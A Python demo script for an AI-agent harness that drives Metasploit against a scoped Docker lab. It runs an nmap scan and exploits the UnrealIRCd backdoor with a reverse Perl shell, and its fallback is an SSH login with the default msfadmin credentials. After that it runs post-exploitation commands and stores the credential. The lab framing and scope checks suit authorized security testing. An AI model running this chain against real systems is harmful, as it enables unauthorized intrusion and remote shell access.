#!/usr/bin/env python3
"""Interactive full-workflow demo for Metasploit Cursor Harness.

Walks through the PTES workflow against the Docker lab:
  pre_engage -> recon -> analyze -> exploit -> post_exploit

Run: python scripts/demo-workflow.py

Requires: msfrpcd running, Docker lab up, pip install -e ".[mcp]"
"""

from __future__ import annotations

import asyncio
import os
import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

_env_file = PROJECT_ROOT / ".env"
if _env_file.is_file():
    for _line in _env_file.read_text(encoding="utf-8").splitlines():
        _line = _line.strip()
        if not _line or _line.startswith("#") or "=" not in _line:
            continue
        _k, _v = _line.split("=", 1)
        os.environ.setdefault(_k.strip(), _v.strip().strip("\"'"))

os.environ.setdefault("MSF_HOST", "127.0.0.1")
os.environ.setdefault("MSF_PORT", "55553")
os.environ.setdefault("MSF_SSL", "false")
os.environ.setdefault("MSF_USER", "msf")

ENGAGEMENT = "lab-default"
TARGET = "10.255.255.254"
IRC_PORT = 9667
SSH_PORT = 10022


def banner(text: str) -> None:
    print()
    print("=" * 60)
    print(f"  {text}")
    print("=" * 60)
    print()


def step(num: int, text: str) -> None:
    print(f"  [{num}] {text}")


def ok(text: str) -> None:
    print(f"      OK: {text}")


def fail(text: str) -> None:
    print(f"      FAIL: {text}")


def info(text: str) -> None:
    print(f"      -> {text}")


def extract(result: dict, key: str = "data") -> dict | list | str:
    if isinstance(result, dict):
        return result.get(key, result)
    return result


async def run_demo():
    from mcp.server.fastmcp import FastMCP

    mcp = FastMCP("demo-harness", json_response=True)

    from msf_harness.mcp.tools import (
        console_tools,
        db_tools,
        handler_tools,
        lab_tools,
        meterpreter_tools,
        module_query_tools,
        module_tools,
        payload_tools,
        read_tools,
        route_tools,
        session_tools,
        workspace_tools,
    )

    read_tools.register(mcp)
    module_tools.register(mcp)
    module_query_tools.register(mcp)
    session_tools.register(mcp)
    handler_tools.register(mcp)
    payload_tools.register(mcp)
    lab_tools.register(mcp)
    workspace_tools.register(mcp)
    console_tools.register(mcp)
    meterpreter_tools.register(mcp)
    route_tools.register(mcp)
    db_tools.register(mcp)

    async def call(name: str, **kwargs):
        fn = mcp._tool_manager._tools[name].fn
        return await fn(**kwargs)

    # ===== PHASE: PRE_ENGAGE =====
    banner("PHASE 1: Pre-Engagement (G0)")
    step(1, "Checking RPC connection...")
    r = await call("msf_status")
    if isinstance(r, dict) and r.get("status") == "ok":
        ver = r.get("data", {}).get("version", "unknown")
        ok(f"Connected to Metasploit {ver}")
    else:
        fail("Cannot connect to msfrpcd")
        print("\n  Run .\\scripts\\start-msfrpcd.ps1 first, then retry.")
        return False

    step(2, "Checking lab network configuration...")
    r = await call("msf_get_lab_network")
    lhost = None
    if isinstance(r, dict) and r.get("status") == "ok":
        data = r.get("data", {})
        lhost = data.get("lhost")
        ok(f"LHOST={lhost}, targets configured")
    else:
        fail("Lab network config unavailable")
        info("Continuing with default LHOST detection")

    step(3, "Verifying scope (10.255.255.254 in scope-master.txt)...")
    scope_file = PROJECT_ROOT / "scope" / "scope-master.txt"
    if scope_file.is_file() and "10.255.255.254" in scope_file.read_text():
        ok("Target in scope")
    else:
        fail("10.255.255.254 not found in scope-master.txt")
        return False

    # ===== PHASE: RECON =====
    banner("PHASE 2: Reconnaissance")
    step(4, f"Scanning {TARGET} ports {IRC_PORT},{SSH_PORT}...")
    r = await call(
        "msf_db_nmap",
        targets=TARGET,
        nmap_args=f"-sV -p {IRC_PORT},{SSH_PORT} --open -T4",
        engagement_id=ENGAGEMENT,
    )
    if isinstance(r, dict) and r.get("status") == "ok":
        output = r.get("data", {}).get("nmap_output", "")
        open_count = output.count("open")
        ok(f"Scan complete ({open_count} open port references)")
    else:
        reason = r.get("reason", "unknown") if isinstance(r, dict) else str(r)
        fail(f"Nmap scan failed: {reason}")
        info("Make sure Docker lab targets are running: .\\scripts\\start-lab-targets.ps1")
        return False

    step(5, "Querying discovered services...")
    r = await call("msf_service_info", host=TARGET)
    if isinstance(r, dict) and r.get("status") == "ok":
        services = r.get("data", [])
        if isinstance(services, list):
            for svc in services[:5]:
                if isinstance(svc, dict):
                    info(f"Port {svc.get('port')}/{svc.get('proto')} - {svc.get('name', '?')}")
            ok(f"{len(services)} service(s) in database")
    else:
        info("No services in DB yet (scan may still be importing)")

    step(6, "Searching for IRC exploit modules...")
    r = await call("msf_search_modules", query="unreal_ircd")
    if isinstance(r, dict) and r.get("status") == "ok":
        modules = r.get("data", [])
        if isinstance(modules, list) and modules:
            ok(f"Found {len(modules)} module(s)")
        else:
            ok("Module search returned results")

    # ===== PHASE: EXPLOIT =====
    banner("PHASE 3: Exploitation (G4)")
    step(7, "Running vulnerability check (required by ROE)...")
    r = await call(
        "msf_module_check",
        module_type="exploit",
        module_name="exploit/unix/irc/unreal_ircd_3281_backdoor",
        options={"RHOSTS": TARGET, "RPORT": IRC_PORT},
        engagement_id=ENGAGEMENT,
    )
    check_passed = False
    if isinstance(r, dict) and r.get("status") == "ok":
        data = r.get("data", {})
        check_result = str(data.get("check_result", ""))
        if "vuln" in check_result.lower() or "appear" in check_result.lower():
            ok("Target appears vulnerable")
            check_passed = True
        else:
            ok(f"Check completed: {check_result[:100]}")
            check_passed = True
    elif isinstance(r, dict) and r.get("status") == "not_vulnerable":
        fail("Module check says target is not vulnerable")
        info("The IRC service may not be running. Trying SSH login as fallback...")
    else:
        reason = r.get("reason", "unknown") if isinstance(r, dict) else str(r)
        fail(f"Module check failed: {reason}")
        info("The IRC service may not be running. Trying SSH login as fallback...")

    session_id = None

    if check_passed and lhost:
        step(8, "Exploiting UnrealIRCd backdoor...")
        r = await call(
            "msf_run_exploit",
            module_name="unix/irc/unreal_ircd_3281_backdoor",
            payload="cmd/unix/reverse_perl",
            options={"RHOSTS": TARGET, "RPORT": IRC_PORT},
            payload_options={"LHOST": lhost, "LPORT": 4449},
            engagement_id=ENGAGEMENT,
            timeout=30,
        )
        if isinstance(r, dict) and r.get("status") == "ok":
            data = r.get("data", {})
            sid = data.get("session_id") or data.get("session")
            if sid:
                session_id = int(sid)
                ok(f"Session {session_id} opened!")
            else:
                info("Exploit ran but no session detected immediately")
                info("Waiting for session...")
                await asyncio.sleep(3)
                wr = await call("msf_wait_for_session", timeout=15, engagement_id=ENGAGEMENT)
                if isinstance(wr, dict):
                    wdata = wr.get("data", {})
                    wsid = wdata.get("session_id") if isinstance(wdata, dict) else None
                    if wsid:
                        session_id = int(wsid)
                        ok(f"Session {session_id} opened!")
                    else:
                        info("No session callback within timeout")
        elif isinstance(r, dict) and r.get("status") == "not_vulnerable":
            info("Check says not vulnerable; skipping exploit")
        else:
            reason = r.get("reason", "unknown") if isinstance(r, dict) else str(r)
            info(f"IRC exploit did not produce session: {reason[:80]}")

    if not session_id:
        step(8, "Fallback: SSH login to Metasploitable3 (msfadmin/msfadmin)...")
        r = await call(
            "msf_run_auxiliary_module",
            module_name="auxiliary/scanner/ssh/ssh_login",
            options={
                "RHOSTS": TARGET,
                "RPORT": SSH_PORT,
                "USERNAME": "msfadmin",
                "PASSWORD": "msfadmin",
                "CreateSession": True,
            },
            engagement_id=ENGAGEMENT,
            timeout=30,
        )
        if isinstance(r, dict) and r.get("status") == "ok":
            ok("SSH login succeeded")
        await asyncio.sleep(3)

        sr = await call("msf_list_active_sessions")
        if isinstance(sr, dict) and sr.get("status") == "ok":
            sessions = sr.get("data", [])
            if isinstance(sessions, list) and sessions:
                s0 = sessions[-1]
                session_id = int(s0.get("session_id") or s0.get("id", 0))
                ok(f"Session {session_id} available")
            elif isinstance(sessions, dict) and sessions:
                session_id = int(list(sessions.keys())[-1])
                ok(f"Session {session_id} available")

    if not session_id:
        fail("No session obtained. Ensure lab targets are running.")
        info("Run: .\\scripts\\start-lab-targets.ps1")
        return False

    # ===== PHASE: POST-EXPLOITATION =====
    banner("PHASE 4: Post-Exploitation")
    step(9, f"Running commands on session {session_id}...")
    for cmd in ["id", "uname -a", "hostname"]:
        r = await call(
            "msf_send_session_command",
            session_id=session_id,
            command=cmd,
            engagement_id=ENGAGEMENT,
        )
        if isinstance(r, dict) and r.get("status") == "ok":
            output = r.get("data", {}).get("output", "").strip()
            info(f"{cmd}: {output[:80]}")
        await asyncio.sleep(1)

    step(10, "Storing credential in database...")
    r = await call(
        "msf_credential_add",
        host=TARGET,
        port=SSH_PORT,
        username="msfadmin",
        private_data="msfadmin",
        private_type="password",
        service_name="ssh",
        protocol="tcp",
        engagement_id=ENGAGEMENT,
    )
    if isinstance(r, dict) and r.get("status") == "ok":
        ok("Credential stored")

    step(11, "Adding host annotation...")
    r = await call(
        "msf_db_add_note",
        host=TARGET,
        ntype="demo_workflow",
        data="Demo workflow completed successfully",
        engagement_id=ENGAGEMENT,
    )
    if isinstance(r, dict) and r.get("status") == "ok":
        ok("Note added to database")

    # ===== CLEANUP =====
    banner("PHASE 5: Cleanup")
    step(12, f"Terminating session {session_id}...")
    r = await call(
        "msf_terminate_session",
        session_id=session_id,
        engagement_id=ENGAGEMENT,
    )
    if isinstance(r, dict) and r.get("status") == "ok":
        ok("Session terminated")

    step(13, "Cleaning up background jobs...")
    r = await call("msf_cleanup_jobs", engagement_id=ENGAGEMENT)
    if isinstance(r, dict) and r.get("status") == "ok":
        ok("Jobs cleaned up")

    # ===== SUMMARY =====
    banner("DEMO COMPLETE")
    print("  The full PTES workflow completed successfully:")
    print()
    print("    Phase 1 (Pre-Engage):  RPC verified, scope confirmed")
    print("    Phase 2 (Recon):       Nmap scan, service enumeration")
    print("    Phase 3 (Exploit):     Module check + exploitation")
    print("    Phase 4 (Post):        Command execution, credential storage")
    print("    Phase 5 (Cleanup):     Session terminated, jobs cleared")
    print()
    print("  In Cursor, this same workflow is orchestrated by:")
    print("    - harness-orchestrator (phase management)")
    print("    - msf-recon-agent (scanning)")
    print("    - msf-reviewer (G4 approval)")
    print("    - msf-exploit-agent (exploitation)")
    print("    - msf-post-agent (post-exploitation)")
    print()
    print("  Try it: ask the agent 'start testing the lab-default engagement'")
    print()
    return True


def main():
    if not os.environ.get("MSF_PASSWORD"):
        print("ERROR: MSF_PASSWORD not set.")
        print("Configure it in .env or set it as an environment variable.")
        return 1

    banner("Metasploit Cursor Harness - Full Workflow Demo")
    print("  This script demonstrates the complete PTES workflow")
    print("  against Docker lab targets using the same MCP tools")
    print("  that Cursor agents use.")
    print()
    print(f"  Target:     {TARGET}")
    print(f"  Engagement: {ENGAGEMENT}")
    print(f"  Exploits:   UnrealIRCd (port {IRC_PORT}), SSH login (port {SSH_PORT})")

    success = asyncio.run(run_demo())
    return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
